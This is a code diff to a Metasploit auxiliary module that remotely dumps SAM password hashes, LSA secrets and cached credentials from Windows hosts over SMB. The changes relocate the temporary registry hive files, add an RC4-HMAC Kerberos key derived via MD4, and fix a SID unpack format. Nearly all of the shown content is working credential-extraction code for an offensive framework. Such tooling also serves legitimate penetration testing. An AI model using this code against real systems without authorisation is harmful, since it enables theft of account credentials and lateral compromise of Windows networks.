@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'metasploit/framework/hashes'
 require 'ruby_smb/dcerpc/client'
 
 class MetasploitModule < Msf::Auxiliary
@@ -36,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
           Dumps SAM hashes and LSA secrets (including cached creds) from the
           remote Windows target without executing any agent locally. First, it
           reads as much data as possible from the registry and then save the
-          hives locally on the target (%SYSTEMROOT%\random.tmp). Finally, it
+          hives locally on the target (%SYSTEMROOT%\Temp\random.tmp). Finally, it
           downloads the temporary hive files and reads the rest of the data
           from it. This temporary files are removed when it's done.
 
@@ -162,7 +161,7 @@ class MetasploitModule < Msf::Auxiliary
 
     file_name = "#{Rex::Text.rand_text_alphanumeric(8)}.tmp"
     vprint_status("Save key to #{file_name}")
-    @winreg.save_key(new_key_handle, file_name)
+    @winreg.save_key(new_key_handle, "..\\Temp\\#{file_name}")
     file_name
   ensure
     @winreg.close_key(new_key_handle) if new_key_handle
@@ -172,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
   def retrieve_hive(hive_name)
     file_name = save_registry_key(hive_name)
     tree2 = simple.client.tree_connect("\\\\#{sock.peerhost}\\ADMIN$")
-    file = tree2.open_file(filename: "System32\\#{file_name}", delete: true, read: true)
+    file = tree2.open_file(filename: "Temp\\#{file_name}", delete: true, read: true)
     file.read
   ensure
     file.delete if file
@@ -442,6 +441,12 @@ class MetasploitModule < Msf::Auxiliary
       salt: salt
     }
 
+    secret << {
+      enctype: Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC,
+      key: OpenSSL::Digest::MD4.digest(raw_secret),
+      salt: nil
+    }
+
     secret
   end
 
@@ -683,7 +688,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Decrypting hash for user: #{user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')}")
 
     entinf_struct = user_record.pmsg_out.msg_getchg.p_objects.entinf
-    rid = entinf_struct.p_name.sid[-4..].unpack('<L').first
+    rid = entinf_struct.p_name.sid[-4..].unpack('L<').first
     dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')
 
     result = {
